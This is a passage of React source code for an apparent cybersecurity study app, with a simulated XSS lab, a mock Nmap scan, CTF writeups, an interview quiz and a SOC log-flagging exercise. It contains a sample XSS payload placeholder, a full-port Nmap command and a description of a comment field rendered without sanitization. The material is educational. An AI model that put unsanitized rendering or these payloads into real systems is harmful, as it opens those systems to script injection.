          This comment field renders user input as raw HTML without sanitization. Any JavaScript you inject will execute in the browser context — as if it were part of the page itself.
        </p>
        <div style={{ marginBottom: 12 }}>
          <label className="mono" style={{ display: "block", fontSize: 10, color: "#445", marginBottom: 5 }}>COMMENT INPUT (unfiltered)</label>
          <input className="cyber-input" value={xssInput} onChange={e => setXssInput(e.target.value)} placeholder='<script>alert("XSS")</script>' onKeyDown={e => e.key === "Enter" && handleXSS()} />
        </div>
        <button className="btn btn-primary" onClick={handleXSS}>SUBMIT COMMENT</button>
        {xssRes && (
          <div style={{ marginTop: 14, padding: 14, borderRadius: 6, background: xssRes.vuln ? "#ff880010" : "#0d111720", border: `1px solid ${xssRes.vuln ? "#ff880050" : "#1e2a3a"}` }}>
            <div style={{ fontWeight: 600, color: xssRes.vuln ? "#ff8800" : "#778", marginBottom: 8 }}>{xssRes.msg}</div>
            {xssRes.vuln && (
              <div className="mono" style={{ background: "#ff880015", borderRadius: 4, padding: "8px 12px", marginBottom: 10, fontSize: 12, color: "#ff8800" }}>
                📢 BROWSER ALERT: {xssInput}
              </div>
            )}
            <pre className="mono" style={{ fontSize: 11, color: "#667", whiteSpace: "pre-wrap", margin: 0, lineHeight: 1.8 }}>{xssRes.detail}</pre>
          </div>
        )}
      </div>

      {/* Port Scanner */}
      <div className="card" style={{ padding: 24, borderTop: "2px solid #00bfff40" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
          <span className="tag tag-blue">SIMULATION</span>
          <span style={{ fontWeight: 600, fontSize: 16, color: "#fff" }}>Nmap Port Scanner</span>
        </div>
        <p style={{ color: "#778", fontSize: 13, marginBottom: 14 }}>
          Simulated Nmap scan against lab target <span className="mono" style={{ color: "#00bfff" }}>10.0.0.22</span>. Watch services get discovered in real time and identify critical vulnerabilities.
        </p>
        <button className="btn btn-primary" onClick={startScan} disabled={scanActive} style={{ marginBottom: 14 }}>
          {scanActive ? "⟳ SCANNING..." : "▶ RUN NMAP SCAN"}
        </button>
        {(scanResults.length > 0 || scanActive) && (
          <div className="card" style={{ padding: 2, borderColor: "#0d1117" }}>
            <div className="mono" style={{ padding: "8px 12px", fontSize: 11, color: "#445", borderBottom: "1px solid #1e2a3a" }}>
              nmap -sV -sC -p- 10.0.0.22  &nbsp;·&nbsp; {scanActive ? "scanning..." : `${scanResults.length} ports found`}
            </div>
            <table className="table-style">
              <thead>
                <tr><th>PORT/PROTO</th><th>STATE</th><th>SERVICE</th><th>VERSION / NOTE</th></tr>
              </thead>
              <tbody>
                {scanResults.map((r, i) => (
                  <tr key={i} style={{ color: r.state === "open" ? "#c8d6e5" : "#334" }}>
                    <td style={{ color: r.state === "open" ? "#00ff88" : "#334" }}>{r.port}/tcp</td>
                    <td><span style={{ color: r.state === "open" ? "#00ff88" : r.state === "filtered" ? "#ffaa00" : "#ff4444" }}>{r.state}</span></td>
                    <td>{r.service}</td>
                    <td style={{ color: "#556", fontSize: 11 }}>{r.ver} {r.note && <span style={{ color: "#ff6644" }}>{r.note}</span>}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}

// ── WRITEUPS ──────────────────────────────────────────────────────────────────

function Writeups() {
  const [open, setOpen] = useState(null);
  return (
    <div className="fade-up">
      <SectionTitle icon="📄" title="WRITEUPS" sub="Documented methodologies from CTF labs and security challenges" />
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
        {WRITEUPS.map((w, i) => (
          <div key={i} className="card-glow" style={{ padding: 20, cursor: "pointer", borderColor: open === i ? w.color + "50" : w.color + "20" }} onClick={() => setOpen(open === i ? null : i)}>
            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8, alignItems: "flex-start" }}>
              <span className="tag" style={{ background: w.color + "18", color: w.color, border: `1px solid ${w.color}40` }}>{w.platform}</span>
              <span className="mono" style={{ fontSize: 10, color: w.diff === "Hard" ? "#ff4444" : w.diff === "Medium" ? "#ff8800" : "#00ff88" }}>{w.diff}</span>
            </div>
            <h3 style={{ fontSize: 14, color: "#e8eef5", fontWeight: 600, lineHeight: 1.4, marginBottom: 10 }}>{w.title}</h3>
            <div style={{ display: "flex", gap: 4, flexWrap: "wrap", marginBottom: open === i ? 14 : 0 }}>
              {w.tags.map(t => <span key={t} className="mono" style={{ fontSize: 10, color: "#556" }}>#{t}</span>)}
            </div>
            {open === i && (
              <div style={{ borderTop: `1px solid ${w.color}25`, paddingTop: 14 }}>
                {w.steps.map((s, j) => (
                  <div key={j} className="mono" style={{ fontSize: 11, color: "#778", lineHeight: 1.7, padding: "2px 0" }}>
                    <span style={{ color: w.color, marginRight: 8 }}>{String(j + 1).padStart(2, "0")}.</span>{s}
                  </div>
                ))}
              </div>
            )}
            <div className="mono" style={{ fontSize: 10, color: "#334", marginTop: 8 }}>
              {open === i ? "▲ collapse" : "▼ expand methodology"}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── INTERVIEW PREP ────────────────────────────────────────────────────────────

function Interview() {
  const [tab, setTab] = useState("mcq");
  const [qi, setQi] = useState(0);
  const [selected, setSelected] = useState(null);
  const [score, setScore] = useState(0);
  const [done, setDone] = useState(false);
  const [ci, setCi] = useState(0);
  const [flipped, setFlipped] = useState(false);
  const [si, setSi] = useState(0);
  const [showSteps, setShowSteps] = useState(false);

  const selectOpt = (idx) => {
    if (selected !== null) return;
    setSelected(idx);
    if (idx === MCQ_DATA[qi].ans) setScore(s => s + 1);
  };
  const nextQ = () => {
    if (qi + 1 >= MCQ_DATA.length) setDone(true);
    else { setQi(q => q + 1); setSelected(null); }
  };
  const resetMCQ = () => { setQi(0); setSelected(null); setScore(0); setDone(false); };
  const flipCard = () => { setFlipped(f => !f); };
  const nextCard = () => { setCi(c => (c + 1) % FLASHCARDS.length); setFlipped(false); };
  const prevCard = () => { setCi(c => (c - 1 + FLASHCARDS.length) % FLASHCARDS.length); setFlipped(false); };

  return (
    <div className="fade-up">
      <SectionTitle icon="🎯" title="INTERVIEW PREP" sub="MCQ quiz · flashcards · SOC scenario response" />
      <div style={{ display: "flex", gap: 8, marginBottom: 24 }}>
        {[["mcq", "MCQ Quiz"], ["flash", "Flashcards"], ["scenario", "SOC Scenarios"]].map(([t, l]) => (
          <button key={t} className={`btn ${tab === t ? "btn-primary" : "btn-ghost"}`} onClick={() => setTab(t)}>{l}</button>
        ))}
      </div>

      {/* MCQ */}
      {tab === "mcq" && (
        <div>
          {!done ? (
            <div className="card" style={{ padding: 28, maxWidth: 680 }}>
              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 20, alignItems: "center" }}>
                <span className="mono" style={{ color: "#00ff88", fontSize: 12 }}>Q {qi + 1} / {MCQ_DATA.length}</span>
                <span className="mono" style={{ color: "#556", fontSize: 12 }}>Score: {score}/{qi}</span>
              </div>
              <div style={{ height: 3, background: "#1e2a3a", borderRadius: 2, marginBottom: 20 }}>
                <div style={{ height: "100%", background: "#00ff88", borderRadius: 2, width: `${((qi) / MCQ_DATA.length) * 100}%`, transition: "width .4s" }} />
              </div>
              <h3 style={{ fontSize: 17, color: "#e8eef5", marginBottom: 20, lineHeight: 1.5 }}>{MCQ_DATA[qi].q}</h3>
              {MCQ_DATA[qi].opts.map((o, i) => (
                <div key={i} className={`mcq-opt ${selected !== null ? (i === MCQ_DATA[qi].ans ? "correct" : i === selected ? "wrong" : "") : ""}`}
                  onClick={() => selectOpt(i)}
                  style={{ cursor: selected !== null ? "default" : "pointer" }}>
                  <span className="mono" style={{ color: "#334", marginRight: 10, fontSize: 12 }}>{String.fromCharCode(65 + i)}.</span>{o}
                </div>
              ))}
              {selected !== null && (
                <div style={{ marginTop: 16, padding: 14, background: "#00ff8810", borderRadius: 6, border: "1px solid #00ff8830" }}>
                  <div className="mono" style={{ fontSize: 10, color: "#00ff8880", marginBottom: 4 }}>EXPLANATION</div>
                  <p style={{ fontSize: 13, color: "#8a9ba8", lineHeight: 1.6 }}>{MCQ_DATA[qi].exp}</p>
                  <button className="btn btn-primary" style={{ marginTop: 14 }} onClick={nextQ}>
                    {qi + 1 < MCQ_DATA.length ? "NEXT QUESTION →" : "SEE RESULTS"}
                  </button>
                </div>
              )}
            </div>
          ) : (
            <div className="card" style={{ padding: 40, textAlign: "center", maxWidth: 500 }}>
              <div className="display" style={{ fontSize: 48, color: score >= 8 ? "#00ff88" : score >= 5 ? "#ff8800" : "#ff4444" }}>
                {score}/{MCQ_DATA.length}
              </div>
              <div style={{ fontSize: 16, color: "#a8bcc8", margin: "12px 0", lineHeight: 1.6 }}>
                {score >= 8 ? "🔥 Excellent! You're interview-ready!" : score >= 5 ? "👍 Good progress — review missed topics" : "📚 Keep studying — you'll get there!"}
              </div>
              <div style={{ display: "flex", gap: 12, justifyContent: "center", marginTop: 20 }}>
                <button className="btn btn-primary" onClick={resetMCQ}>RETRY QUIZ</button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Flashcards */}
      {tab === "flash" && (
        <div style={{ maxWidth: 600 }}>
          <div className="mono" style={{ color: "#556", fontSize: 11, marginBottom: 16 }}>
            Card {ci + 1} of {FLASHCARDS.length} &nbsp;·&nbsp; Click card to flip
          </div>
          <div className="fc" onClick={flipCard} style={{ borderColor: flipped ? "#00bfff50" : "#1e2a3a", marginBottom: 20 }}>
            {!flipped ? (
              <div>
                <div className="display" style={{ fontSize: 36, color: "#00bfff", marginBottom: 8 }}>{FLASHCARDS[ci].f}</div>
                <div className="mono" style={{ fontSize: 10, color: "#334" }}>tap to reveal answer</div>
              </div>
            ) : (
              <div>
                <div className="mono" style={{ fontSize: 10, color: "#00bfff80", marginBottom: 12 }}>ANSWER</div>
                <pre style={{ fontFamily: "'Share Tech Mono', monospace", fontSize: 14, color: "#c8d6e5", whiteSpace: "pre-wrap", textAlign: "center", lineHeight: 1.8 }}>
                  {FLASHCARDS[ci].b}
                </pre>
              </div>
            )}
          </div>
          <div style={{ display: "flex", gap: 10, justifyContent: "center" }}>
            <button className="btn btn-ghost" onClick={prevCard}>← PREV</button>
            <button className="btn btn-primary" onClick={nextCard}>NEXT →</button>
          </div>
          <div style={{ display: "flex", gap: 4, justifyContent: "center", marginTop: 16, flexWrap: "wrap" }}>
            {FLASHCARDS.map((_, i) => (
              <div key={i} style={{ width: 8, height: 8, borderRadius: "50%", background: i === ci ? "#00bfff" : "#1e2a3a", cursor: "pointer", transition: "all .2s" }} onClick={() => { setCi(i); setFlipped(false); }} />
            ))}
          </div>
        </div>
      )}

      {/* Scenarios */}
      {tab === "scenario" && (
        <div style={{ maxWidth: 700 }}>
          <div style={{ display: "flex", gap: 8, marginBottom: 20 }}>
            {SCENARIOS.map((s, i) => (
              <button key={i} className={`btn ${si === i ? "btn-primary" : "btn-ghost"}`} style={{ fontSize: 11 }} onClick={() => { setSi(i); setShowSteps(false); }}>
                Scenario {i + 1}
              </button>
            ))}
          </div>
          <div className="card" style={{ padding: 24 }}>
            <div className="tag tag-red" style={{ marginBottom: 14 }}>SOC ANALYST SCENARIO</div>
            <p style={{ fontSize: 15, color: "#e8eef5", lineHeight: 1.7, marginBottom: 20, borderLeft: "2px solid #ff4444", paddingLeft: 16 }}>
              {SCENARIOS[si].q}
            </p>
            {!showSteps ? (
              <button className="btn btn-primary" onClick={() => setShowSteps(true)}>REVEAL IDEAL RESPONSE</button>
            ) : (
              <div>
                <div className="mono" style={{ color: "#ff4444", fontSize: 11, marginBottom: 14 }}>
                  ASSESSMENT: {SCENARIOS[si].verdict}
                </div>
                {SCENARIOS[si].steps.map((step, j) => (
                  <div key={j} style={{ display: "flex", gap: 12, padding: "8px 0", borderBottom: "1px solid #1e2a3a" }}>
                    <span className="mono" style={{ color: "#00ff8866", fontSize: 11, minWidth: 24, marginTop: 1 }}>{String(j + 1).padStart(2, "0")}.</span>
                    <span style={{ fontSize: 14, color: "#a8bcc8", lineHeight: 1.6 }}>{step}</span>
                  </div>
                ))}
                <button className="btn btn-ghost" style={{ marginTop: 16 }} onClick={() => setShowSteps(false)}>TRY AGAIN</button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// ── SOC SIMULATOR ─────────────────────────────────────────────────────────────

function SOCSim() {
  const [flagged, setFlagged] = useState(new Set());
  const [submitted, setSubmitted] = useState(false);

  const toggle = (id) => {
    if (submitted) return;
    setFlagged(prev => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s; });
  };
  const suspicious = LOGS.filter(l => l.suspicious).map(l => l.id);
  const submit = () => setSubmitted(true);
  const reset = () => { setFlagged(new Set()); setSubmitted(false); };

  const correct = [...flagged].filter(id => suspicious.includes(id)).length;
  const fp = [...flagged].filter(id => !suspicious.includes(id)).length;
  const missed = suspicious.filter(id => !flagged.has(id)).length;

  const getRowClass = (log) => {
    if (!submitted) return flagged.has(log.id) ? "flagged" : "";
    if (log.suspicious && flagged.has(log.id)) return "correct-flag";
    if (!log.suspicious && flagged.has(log.id)) return "wrong-flag";
    if (log.suspicious && !flagged.has(log.id)) return "missed";
    return "";
  };

  const levelColor = { INFO: "#556", WARN: "#ffaa00", CRIT: "#ff4444" };

  return (
    <div className="fade-up">
      <SectionTitle icon="📊" title="SOC ANALYST SIMULATOR" sub="Analyze the log file below — click to flag suspicious events, then submit" />
      <div style={{ display: "flex", gap: 16, marginBottom: 20, alignItems: "flex-start", flexWrap: "wrap" }}>
        <div className="card" style={{ padding: 14, flex: 1 }}>
          <div className="mono" style={{ fontSize: 10, color: "#445", marginBottom: 6 }}>TASK BRIEF</div>
          <p style={{ fontSize: 13, color: "#778", lineHeight: 1.6 }}>
            You are SOC L1 Analyst. Review the SIEM log below. Click any log entry you consider suspicious or malicious to flag it. When done, click Submit for scoring.
          </p>
        </div>
        {!submitted ? (
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            <span className="mono" style={{ fontSize: 11, color: "#556" }}>Flagged: {flagged.size} events</span>
            <button className="btn btn-primary" onClick={submit} disabled={flagged.size === 0}>SUBMIT ANALYSIS</button>
          </div>
        ) : (
          <div className="card" style={{ padding: 14, minWidth: 200 }}>
            <div className="mono" style={{ fontSize: 10, color: "#445", marginBottom: 8 }}>YOUR SCORE</div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
              <div style={{ textAlign: "center" }}>
                <div className="display" style={{ fontSize: 28, color: "#00ff88" }}>{correct}/{suspicious.length}</div>
                <div style={{ fontSize: 10, color: "#556" }}>detected</div>
              </div>
              <div style={{ textAlign: "center" }}>
                <div className="display" style={{ fontSize: 28, color: "#ff4444" }}>{fp}</div>
                <div style={{ fontSize: 10, color: "#556" }}>false positives</div>
              </div>
            </div>
            {missed > 0 && <div className="mono" style={{ fontSize: 10, color: "#ff444488", marginTop: 8 }}>{missed} threats missed — see red rows</div>}
            <button className="btn btn-ghost" style={{ marginTop: 10, width: "100%", fontSize: 11 }} onClick={reset}>RETRY</button>
          </div>
        )}
      </div>

      <div className="card" style={{ padding: 4 }}>
        <div style={{ padding: "8px 12px", borderBottom: "1px solid #1e2a3a", display: "flex", gap: 16 }}>
          <span className="mono" style={{ fontSize: 10, color: "#445" }}>SIEM LOG VIEWER</span>
          <span className="mono" style={{ fontSize: 10, color: "#445" }}>HOST: 10.0.0.22 · 08:00–08:25 UTC</span>
          {!submitted && <span className="mono" style={{ fontSize: 10, color: "#00ff8866", marginLeft: "auto" }}>Click rows to flag</span>}
        </div>
        <div style={{ padding: 8 }}>
          {LOGS.map(log => (
            <div key={log.id} className={`log-row ${getRowClass(log)}`} onClick={() => toggle(log.id)}>
              <span style={{ color: "#334", marginRight: 12 }}>{log.time}</span>
              <span style={{ color: "#556", marginRight: 12 }}>[{log.src}]</span>
              <span style={{ color: levelColor[log.level], marginRight: 8, minWidth: 32, display: "inline-block" }}>[{log.level}]</span>
              <span style={{ color: flagged.has(log.id) && !submitted ? "#ff8888" : "#a8bcc8" }}>{log.event}</span>
              {submitted && log.suspicious && !flagged.has(log.id) && (
                <span style={{ marginLeft: 12, color: "#ff444466", fontSize: 10 }}>← MISSED</span>
              )}
              {submitted && !log.suspicious && flagged.has(log.id) && (
                <span style={{ marginLeft: 12, color: "#ffaa0066", fontSize: 10 }}>← FALSE POSITIVE</span>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── TOOLS ─────────────────────────────────────────────────────────────────────

function Tools() {
  const [active, setActive] = useState(null);
  return (
    <div className="fade-up">
      <SectionTitle icon="🛠" title="TOOLS SHOWCASE" sub="Not just 'I know Nmap' — proof of real-world usage with findings" />
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 14 }}>
        {TOOLS.map((t, i) => (
          <div key={i} className="card-glow" style={{ padding: 20, cursor: "pointer", borderColor: active === i ? t.color + "50" : t.color + "18" }}
            onClick={() => setActive(active === i ? null : i)}>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
              <span style={{ fontSize: 26 }}>{t.icon}</span>
              <div>
                <div className="display" style={{ fontSize: 20, color: t.color }}>{t.name}</div>
                <div style={{ fontSize: 11, color: "#556" }}>{t.cat}</div>
              </div>
            </div>
            <p style={{ fontSize: 12, color: "#667", lineHeight: 1.5, marginBottom: 10 }}>{t.desc}</p>
            <div className="card" style={{ padding: "6px 10px", borderColor: "#0d1117" }}>
              <span className="mono" style={{ fontSize: 10, color: t.color + "aa" }}>{t.cmd.split("\n")[0]}</span>
            </div>
            {active === i && (
              <div style={{ marginTop: 12, padding: 12, background: t.color + "0c", borderRadius: 6, border: `1px solid ${t.color}25` }}>
                <div className="mono" style={{ fontSize: 10, color: t.color + "88", marginBottom: 6 }}>REAL USAGE + FINDINGS</div>
                <p style={{ fontSize: 12, color: "#8a9ba8", lineHeight: 1.7 }}>{t.story}</p>
              </div>
            )}
            <div className="mono" style={{ fontSize: 10, color: "#334", marginTop: 10 }}>
              {active === i ? "▲ collapse" : "▼ see real usage"}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── CONTACT ───────────────────────────────────────────────────────────────────

function Contact() {
  return (
    <div className="fade-up" style={{ maxWidth: 600 }}>
      <SectionTitle icon="💼" title="RESUME & CONTACT" sub="Links, social presence, and downloadable resume" />
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 20 }}>
        {[
          { icon:"🐙", label:"GitHub", handle:"github.com/prashant-sec", color:"#c8d6e5" },
          { icon:"💼", label:"LinkedIn", handle:"linkedin.com/in/prashant", color:"#0a66c2" },
          { icon:"🎯", label:"TryHackMe", handle:"tryhackme.com/p/prashant", color:"#e83e3e" },
          { icon:"📧", label:"Email", handle:"prashant@example.com", color:"#00ff88" },
        ].map(l => (
          <div key={l.label} className="card-glow" style={{ padding: 18, borderColor: l.color + "25" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <span style={{ fontSize: 24 }}>{l.icon}</span>
              <div>
                <div style={{ fontSize: 13, color: "#556" }}>{l.label}</div>
                <div className="mono" style={{ fontSize: 12, color: l.color }}>{l.handle}</div>
              </div>
            </div>
          </div>
        ))}
      </div>
      <div className="card" style={{ padding: 24 }}>
        <div className="mono" style={{ fontSize: 11, color: "#00ff88", marginBottom: 14 }}>&gt; ABOUT_ME.txt</div>
        <p style={{ color: "#8a9ba8", lineHeight: 1.8, fontSize: 14 }}>
          B.Tech CSE student at UCER Prayagraj (AKTU), graduating 2027. Focused on offensive security research, threat detection systems, and applied ML in cybersecurity. Built AI-powered security tools including a WAF bypass framework, autonomous honeypot system, and AI Cyber Guardian threat prediction platform.
        </p>
        <div style={{ marginTop: 16, display: "flex", gap: 8, flexWrap: "wrap" }}>
          {["Internship: Penetration Testing","Internship: Malware Analysis","CTF Competitor","Open Source Contributor"].map(b => (
            <span key={b} className="tag tag-green" style={{ fontSize: 11 }}>{b}</span>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── ROOT ──────────────────────────────────────────────────────────────────────

export default function CyberPrepPro() {
  const [page, setPage] = useState("dashboard");
  const [stats, setStats] = useState({ labs: 0, vulns: 0, tools: 0, ctf: 0 });

  useEffect(() => {
    const el = document.createElement("style");
    el.textContent = CSS;
    document.head.appendChild(el);
    return () => document.head.removeChild(el);
  }, []);

  useEffect(() => {
    if (page !== "dashboard") return;
    const target = { labs: 25, vulns: 10, tools: 12, ctf: 8 };
    let frame = 0;
    const id = setInterval(() => {
      frame++;
      const t = Math.min(frame / 45, 1);
      setStats({
        labs: Math.round(target.labs * t),
        vulns: Math.round(target.vulns * t),
        tools: Math.round(target.tools * t),
        ctf: Math.round(target.ctf * t),
      });
      if (frame >= 45) clearInterval(id);
    }, 28);
    return () => clearInterval(id);
  }, [page]);

  const navItems = [
    ["dashboard", "🏠 Home"],
    ["learn", "📚 Learn"],
    ["toolsref", "🛠 Tools"],
    ["flashcards", "🃏 Flashcards"],
    ["mocktests", "📝 Mock Tests"],
    ["labs", "⚡ Labs"],
    ["interview", "🎯 Interview"],
    ["soc", "📊 SOC Sim"],
    ["writeups", "📄 Writeups"],
    ["contact", "💼 Contact"],
  ];

  return (
    <div style={{ minHeight: "100vh", background: "var(--bg-base)" }}>

      {/* Top bar */}
      <div style={{ background: "rgba(15,20,25,.95)", borderBottom: "1px solid var(--border)", padding: "0 24px", position: "sticky", top: 0, zIndex: 100, backdropFilter: "blur(12px)" }}>
        <div style={{ maxWidth: 1200, margin: "0 auto", display: "flex", alignItems: "center", height: 56 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginRight: 32, cursor: "pointer" }} onClick={() => setPage("dashboard")}>
            <div style={{ width: 32, height: 32, borderRadius: 8, background: "linear-gradient(135deg, #6C63FF, #00B4D8)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16 }}>🛡️</div>
            <div className="display" style={{ fontSize: 18, color: "var(--text-primary)" }}>
              CyberPrep<span style={{ color: "var(--accent)" }}>Pro</span>
            </div>
          </div>
          <div style={{ display: "flex", gap: 2, flexWrap: "wrap", flex: 1 }}>
            {navItems.map(([id, label]) => (
              <div key={id} className={`nav-link ${page === id ? "active" : ""}`} onClick={() => setPage(id)}>{label}</div>
            ))}
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="study-bg" style={{ minHeight: "calc(100vh - 56px)", padding: "36px 24px" }}>
        <div style={{ maxWidth: 1200, margin: "0 auto" }}>
          {page === "dashboard" && <Dashboard stats={stats} onNav={setPage} />}
          {page === "learn" && <LearnPage />}
          {page === "toolsref" && <ToolsPage />}
          {page === "flashcards" && <FlashcardsPage />}
          {page === "mocktests" && <MockTestsPage />}
          {page === "labs" && <Labs />}
          {page === "writeups" && <Writeups />}
          {page === "interview" && <Interview />}
          {page === "soc" && <SOCSim />}
          {page === "tools" && <Tools />}
          {page === "contact" && <Contact />}
        </div>
      </div>

      {/* Footer */}
      <div style={{ borderTop: "1px solid var(--border)", padding: "16px 24px", textAlign: "center", background: "var(--bg-card)" }}>
        <span style={{ fontSize: 12, color: "var(--text-dim)" }}>
          CyberPrep Pro — Learn Ethical Hacking, SOC Analysis & Penetration Testing · For educational purposes only
        </span>
      </div>
    </div>
  );
}
